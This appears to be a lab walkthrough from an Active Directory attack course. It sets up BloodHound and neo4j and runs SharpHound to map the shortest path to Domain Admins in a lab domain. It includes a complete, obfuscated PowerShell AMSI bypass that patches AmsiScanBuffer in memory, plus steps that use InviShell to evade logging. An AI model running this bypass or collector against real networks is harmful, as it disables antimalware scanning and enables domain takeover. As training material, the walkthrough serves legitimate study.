# 06 - BloodHound - SharpHound

* Setup BloodHound and identify shortest path to Domain Admins in the dollarcorp domain

Unzip the archive C:\AD\Tools\neo4j-community-4.1.1- windows.zip.

Install and start the neo4j service as follows:

```powershell
.\neo4j.bat install-service
.\neo4j.bat start
```

Once the service gets started browse to:

```powershell
http://localhost:7474
username: neo4j
password: neo4j
newpassword: BloodHound
```

Now, run BloodHound and provide the following details:

```powershell
C:\AD\Tools\BloodHound-win32-x64\BloodHound-win32-x64\BloodHound.exe
bolt://localhost:7687
Username: neo4j
Password:BloodHound
```

**Byassping .NET AMSI before running SharpHound.ps1** using the following code:

```powershell
$ZQCUW = @"
using System;
using System.Runtime.InteropServices;
public class ZQCUW {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
}
"@

Add-Type $ZQCUW

$BBWHVWQ = [ZQCUW]::LoadLibrary("$([SYstem.Net.wEBUtIlITy]::HTmldecoDE('&#97;&#109;&#115;&#105;&#46;&#100;&#108;&#108;'))")
$XPYMWR = [ZQCUW]::GetProcAddress($BBWHVWQ, "$([systeM.neT.webUtility]::HtMldECoDE('&#65;&#109;&#115;&#105;&#83;&#99;&#97;&#110;&#66;&#117;&#102;&#102;&#101;&#114;'))")
$p = 0
[ZQCUW]::VirtualProtect($XPYMWR, [uint32]5, 0x40, [ref]$p)
$TLML = "0xB8"
$PURX = "0x57"
$YNWL = "0x00"
$RTGX = "0x07"
$XVON = "0x80"
$WRUD = "0xC3"
$KTMJX = [Byte[]] ($TLML,$PURX,$YNWL,$RTGX,+$XVON,+$WRUD)
[System.Runtime.InteropServices.Marshal]::Copy($KTMJX, 0, $XPYMWR, 6)

```

Run the following commands to run Collector:

```powershell
C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat
cd C:\AD\Tools\BloodHound-master\BloodHound-master\Collectors
$ZQCUW = @"[snip .NET AMSI bypass]"@ #The code above
. .\SharpHound.ps1
Invoke-BloodHound -CollectionMethod All -Verbose
Invoke-BloodHound -CollectionMethod LoggedOn -Verbose
```

Upload the two zip created in BloodHound web and watch results.

The latest version of BloodHound (4.2.0) does not show Derivate Local Admin edge in GUI. The last version where it worked was 4.0.3. It is present in the Tools directory as BloodHound-4.0.3\_old. You can use it the same way as above.

Make sure to use the collector from BloodHound-4.0.3\_old with UI in BloodHound-4.0.3\_old. These are not compatible with BloodHound 4.2.0.

